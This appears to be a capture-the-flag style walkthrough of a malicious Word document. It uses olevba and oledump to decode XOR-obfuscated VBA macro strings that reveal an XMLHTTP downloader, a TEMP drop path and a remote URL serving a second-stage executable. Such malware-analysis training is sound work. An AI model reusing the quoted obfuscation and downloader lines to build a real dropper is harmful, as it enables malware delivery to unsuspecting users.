1. Run the command [olevba attacker4.doc] which will give all the content assossiated with attacker4.doc. Now look for the very first encoded string, which is at the line [Set VPBCRFOQENN = CreateObject(XORI(Hextostring("3F34193F254049193F253A331522"), Hextostring("7267417269")))]. This line suggests that an object is being created. Hence, to get the original string, convert the first hex string to bytes, XOR each byte with the corresponding byte of the second hex string (repeated cyclically), and convert the XOR result to text [MSXML2.XMLHTTP].

2. The line in the content [ZUWSBYDOTWV gGHBkj, Environ(XORI(Hextostring("3E200501"), Hextostring("6A654851714A64"))) & XORI(Hextostring("11371B0A00123918220E001668143516"), Hextostring("4D734243414671"))] suggests an Environ function, that retrieves the value of an environment variable. Hence, decode it and we will get [TEMP + \DYIATHUQLCW.exe]. Remove [\] to get the exact answer.

3. The directory into which the binary is being dropped in clearly mentioned in the above data [TEMP].

4. The line [gGHBkj = XORI(Hextostring("1C3B2404757F5B2826593D3F00277E102A7F1E3C7F16263E5A2A2811"), Hextostring("744F50"))] most probably represents the storing of some data, so lets just decode it and see what it gives: [http://gv-roth.de/js/bin.exe]. So, the second binary is [bin.exe].

5. The full path from where the second binary was downloaded is [gv-roth.de/js/bin.exe], after removing the [https] as required in the statement.


### To answer all the question, you may first decode all the lines containing the word [XORI], and then figure out all the answers easily. For this, run the command [oledump.py attacker4.doc -s 7 -v | grep XORI].
